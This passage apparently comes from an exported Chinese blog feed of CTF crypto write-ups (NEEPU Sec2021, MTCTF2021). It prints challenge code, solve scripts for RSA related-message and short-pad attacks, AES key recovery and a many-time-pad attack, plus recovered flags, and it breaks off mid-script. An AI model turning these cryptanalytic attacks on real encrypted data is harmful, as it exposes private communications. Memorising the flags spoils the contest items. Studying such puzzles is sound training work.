<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;2BD8A9A8E61F7B31C1D46B387CB0278D&#125;</span><br></pre></td></tr></table></figure>

<p>但是这个交不上，然后用python2运行他给我们的脚本，发现出来的base64有些许不同</p>
<p>好家伙，原来是魔改</p>
<p>最后得到的是，只有几位之差</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;2BD8A9A8E61F7B31C1D46O1X7CB0278D&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>然后Crypto就没出题了，都古典，做了几个没啥兴致，也没啥思路了</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>有道宁波训练赛的题目，找到wp，感觉加密方式也挺新颖的，摘记下</p>
<h3 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h3><img alt="20210523 前方到站宁波站-09be9b5a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210523 前方到站宁波站-09be9b5a.png" width="" height="" >

<p>完全没思路，看师傅的吧</p>
<img alt="20210523 前方到站宁波站-1c21d9b3.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210523 前方到站宁波站-1c21d9b3.png" width="" height="" >

<p>挺经典的，但不知道这种加密叫什么，就是一般的二维表格吧也不是，有点像playfair，但又不完全像，希望知道的师傅带带我这只小菜鸡吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210522 NEEPU Sec2021公开赛Crypto方向WP</title>
    <url>/posts/e22cbbee/</url>
    <content><![CDATA[<p>和buu一个风格的网站</p>
<p>又是被组员嘲讽的一天</p>
<span id="more"></span>

<h1 id="NEEPU-Sec2021公开赛"><a href="#NEEPU-Sec2021公开赛" class="headerlink" title="NEEPU Sec2021公开赛"></a>NEEPU Sec2021公开赛</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>组员都做出来，自己都没有想到，反思一下</p>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>代码并不复杂，常规的运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span> (<span class="params">p1,p2,e</span>):</span></span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;Neepu&#123;********************&#125;&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = nextprime(random.randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = encode(p, q, e)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, <span class="number">7</span>, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+e, <span class="number">7</span>, n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;</span></span><br><span class="line"><span class="string">&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;</span></span><br><span class="line"><span class="string">&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;</span></span><br><span class="line"><span class="string">&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h4><p>首先套了一个短的padding的，用Related Message Attack可以整出来，接用la师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt; x, y &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt; xn &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt; xz, yz &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x ^ e - c1</span><br><span class="line">    g2 = (x + y) ^ e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    kbits = n.nbits() // (<span class="number">2</span> * e * e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x ^ e - c1</span><br><span class="line">    g2 = (x + diff) ^ e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c2 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">    c1 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">    n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m1:&quot;</span>, m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m2:&quot;</span>, m1 + diff)</span><br></pre></td></tr></table></figure>

<p>出来是<br><img alt="20210522 又是被组员嘲讽的一天-a21cb98f.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-a21cb98f.png" width="" height="" ><br>显然第二个才是我们需要的m，两个相减可以得到e</p>
<p>其次，出题人用一个加密函数加密了p和q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span> (<span class="params">p1,p2,e</span>):</span></span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br></pre></td></tr></table></figure>

<p>提取一下，已知</p>
<p>$e\times S\equiv 1\ (mod\ (p+1)*(q+1))$<br>$not_p\equiv S\ (mod\ (p+1))$</p>
<p>这里主要是引入一条显而易见的形式</p>
<p>若$n\ mod\ (p*q)=1$，则，<br>$$<br>n\ mod\ q=1，n\ mod\ p=1<br>$$<br>这个结论的证明很简单，如果说n是p和q的乘积多1的话，那么，显然n也是p的倍数多1，q也同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">c1 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">c2 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">c = <span class="number">78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671</span></span><br><span class="line">m_e = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340930</span></span><br><span class="line">m = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br><span class="line"><span class="comment"># e = m_e - m</span></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line">e = <span class="number">71</span></span><br><span class="line">not_p = m</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*not_p-<span class="number">1</span>) % i == <span class="number">0</span> <span class="keyword">and</span> isPrime((e*not_p-<span class="number">1</span>) // i - <span class="number">1</span>):</span><br><span class="line">        p = (e*not_p-<span class="number">1</span>) // i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>

<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = os.urandom(<span class="number">18</span>)</span><br><span class="line">flag_enc = os.urandom(<span class="number">45</span>)</span><br><span class="line"><span class="built_in">print</span>(flag_enc)</span><br><span class="line">pad = <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + <span class="string">b&#x27;Neepu&#123;&#x27;</span></span><br><span class="line">flag_enc = pad+flag_enc+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">masg1 = flag_enc[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">masg2 = flag_enc[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(masg1) ^ bytes_to_long(masg2)</span><br><span class="line">key = os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">iv = masg2[<span class="number">16</span>:][:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv))</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">enc_flag = aes.encrypt(long_to_bytes(m))</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个题目有两个值得我注意的，一是之一直都不知道AES这么爆破，但是现在知道怎么用脚本了，多亏了组员给我压力，但是原理后面还是要好好研究；二是找到一个全新的加密形式，利用键盘把选择被包围起来的字母，这个下面再说</p>
<p>首先找了下脚本，可以跑出iv和key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">xor = <span class="number">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line">out = long_to_bytes(xor)</span><br><span class="line">key = out[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:]) ^ bytes_to_long(out[<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">iv = long_to_bytes(iv)</span><br></pre></td></tr></table></figure>

<p>然后这里我们可以算出一部分的masg1，接着</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(bytes_to_long(m) ^ bytes_to_long(iv)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\r\x11\x18\x0b\x08L\x08\x0b\r\x0c\x14\n!\x00\x16\x13u&#123;qszeftwdr-thui&#x27;</span><br></pre></td></tr></table></figure>

<p>一看刚好是16位，结合前面的12个a还有’Neep’，整好32位，masg1齐了，他们和密文是异或的关系，那么masg2还会远吗？答案是肯定的，远</p>
<p>个der</p>
<p>连起来是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125;</span><br></pre></td></tr></table></figure>

<p>我交了，我错了</p>
<p>没道理啊，虽然确实没有什么含义</p>
<p>但是又是307，又是那个男人，在我迷茫的时候给我指点迷津</p>
<p>手打了一遍之后发现是一种新编码，在Crypto全是古典的宁波赛上也遇到过<br>在电脑键盘上被这些字母包围起来的是真正的明文</p>
<p>根据分隔符提示，flag里面包着的应该是下面这一串，可能会有几个字母对错，根据含义就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">are-you-kidding</span><br></pre></td></tr></table></figure>

<h3 id="中国古代加密"><a href="#中国古代加密" class="headerlink" title="中国古代加密"></a>中国古代加密</h3><img alt="20210522 又是被组员嘲讽的一天-d5aef625.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-d5aef625.png" width="" height="" >

<p>挺有意思的提道题，主要是运用到了反切注音</p>
<p>然后一些细节有点费解吧</p>
<p>然后出了三条hint，比赛结束了才有时间写wp，主要是说第一个红字处的对子是构成了flag的头尾，然后第二个红字处的一首诗歌要分成上下来看，还有就是排列组合，其他的感觉也没什么用</p>
<p>我就从做出来的角度返回去看吧，求解的过程中还是很曲折的</p>
<p>首先我们看头尾是花甲重逢+三七岁月和古稀双庆+一度春秋，这个对子的出处就是乾隆和纪晓岚为一为140岁老人对的，60 * 2 + 27和70 * 2 + 1都是等于141，所以收尾开头是141</p>
<p>其次两首诗分开，前两句是对应声母，找出密文对应的声母在头两句14个字中的位子，后两句是对应韵母，同样也是找对应的，并且这里不考虑声调，声调是另外编码的1~4，然后拼凑起来，注意这里是要凑的，因为存在重复的韵母和声母，而且也没有确切指明是哪一个</p>
<p>最后的flag是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">141181832310414124141</span><br></pre></td></tr></table></figure>

<p>这么看比较简单，但是当时提示比较少，走了很多歪路，因为反切注音还有很多变式和不成文的规定</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="The-Puzzles-of-the-Fifteen-Tiles"><a href="#The-Puzzles-of-the-Fifteen-Tiles" class="headerlink" title="The Puzzles of the Fifteen Tiles"></a>The Puzzles of the Fifteen Tiles</h3><img alt="20210522 又是被组员嘲讽的一天-76ae8347.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-76ae8347.png" width="" height="" >

<p>看看这个男人的嘴脸</p>
<p>第一次玩的时候，前面三行都整好了，但是最后一行借助倒数第三行怎么也搞不好</p>
<p>然后去找了一些技巧，主要有两点，第一是要制造出这样的形状，就容易得多</p>
<img alt="20210522 又是被组员嘲讽的一天-ee4c638b.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210522 又是被组员嘲讽的一天-ee4c638b.png" width="" height="" >

<p>其次，最后两排应该这样排好这两排的第一列， 然后是第二列，依次下去</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210527 MTCTF2021Crypto方向部分复现</title>
    <url>/posts/43deb916/</url>
    <content><![CDATA[<p>看了下日期，又不能快乐地刷题了</p>
<p>那天竟然被宁波的比赛耽误，错过了美团，赛后复现一下</p>
<span id="more"></span>

<h1 id="20210527-MTCTF2021Crypto方向部分复现"><a href="#20210527-MTCTF2021Crypto方向部分复现" class="headerlink" title="20210527 MTCTF2021Crypto方向部分复现"></a>20210527 MTCTF2021Crypto方向部分复现</h1><h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>第一层套了一个padding，比较常规不再赘述</p>
<p>第二层是多次一加密（Many Time Pad），大致的加密思路就是每次都用相同的key去加密明文，注意一次一密（One Time Pad）的区别</p>
<h3 id="第二层的题目描述"><a href="#第二层的题目描述" class="headerlink" title="第二层的题目描述"></a>第二层的题目描述</h3><p>输入第一层的密码，压缩包文件里的内容是这样的，有十二个十六进制的数字</p>
<img alt="easy_RSA-a8cb1b59.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easy_RSA-a8cb1b59.png" width="" height="">

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>话不多说，直接去找脚本，大致的思路是按照这位师傅的博客<a href="https://www.ruanx.net/many-time-pad/">https://www.ruanx.net/many-time-pad/</a>来的，讲得太好了</p>
<p>主要就是两个密文异或，可以把相同的key去掉，这样就相当于两个明文异或了<br>（这里注意尽管OTP的安全系数相当高，但是由于密码分发的问题，难以实现，所以这里当成MTP来做了）</p>
<p>至于攻击的手段，时间有限先不展开；有了脚本之后，并不代表一切的终结，我们还需要做一下操作</p>
<h3 id="脚本改编"><a href="#脚本改编" class="headerlink" title="脚本改编"></a>脚本改编</h3><p>首先当然是把读文件里的文件名换一下啦，注意最好删去逗号</p>
<p>然后直接运行会报错，因为密文不等长，可以先把第六和第十二个密文填充和其他密文等长的长度</p>
<p>第一次运行结果是这样的（下面这个[u]utf-8表示不了，任由其在这里导致xml报错博客不能本地搜索，所以用个[u]代替下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N=w -ou need to u&#125;e the k3</span><br><span class="line">o%n 2lag as the kky of On8</span><br><span class="line">[u]im1 Pad Encryptgn. Now )</span><br><span class="line">h3t -ou have passkd the p/</span><br><span class="line">e$io!s RSA test, zhis cha1</span><br><span class="line">l7ng1 is not partgcularly</span><br><span class="line">p&gt;ea&#x27;e get the tr&#123;e messa:</span><br><span class="line">d;ff=cult for you  It is 7</span><br><span class="line">u!t &#x27;imple encrypzion.I h2</span><br><span class="line">p7 y;u can solve zhis pro?</span><br><span class="line">l7m %uickly and gkt the c2</span><br><span class="line">r ec  answer succksslyp@d</span><br><span class="line">b&#x27;f&gt;ag/it_1s_P@dd1nQ@nd_p@d &#x27;</span><br></pre></td></tr></table></figure>

<p>（？？？小朋友你是不是有很多问号）</p>
<p>为什么会出现乱码和明文混合的现象呢，这个要和攻击的原理挂钩，暂时也不展开</p>
<p>而我们所要做的第二步就是愉快的猜字母环节，将很明显错地方的字母给替换成对的，替换的函数师傅已经写好了，直接用就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">p_index, p_pos, ch</span>):</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要手动更改的就是这个地方，按照意思，替换你确定的字母</span></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">25</span>, <span class="string">&#x27;e&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后运行得到完整的明文和flag，至于之前的在末尾填充0，也是试出来</p>
<p>贴一下完整脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ischr</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">infer</span>(<span class="params">p_index, p_pos</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg[p_index, p_pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_space</span>():</span></span><br><span class="line">    <span class="keyword">for</span> t_index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x != y]</span><br><span class="line">        f = <span class="keyword">lambda</span> t_pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(ischr, [s[t_pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(t_pos) <span class="keyword">for</span> t_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> t_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(t_pos), t_index, t_pos))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第十二行和第六行长度不一，末尾填充0就好了</span></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;t3mpt.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">get_space()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">p_index, p_pos, ch</span>):</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要手动更改的就是这个地方，按照意思，替换你确定的字母</span></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">25</span>, <span 